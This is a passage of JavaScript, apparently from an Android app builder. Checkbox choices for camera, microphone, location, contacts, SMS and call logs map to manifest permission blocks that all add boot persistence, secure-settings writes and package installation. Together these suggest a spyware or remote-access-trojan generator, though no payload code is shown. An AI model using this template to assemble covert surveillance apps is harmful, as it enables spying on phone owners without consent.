            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
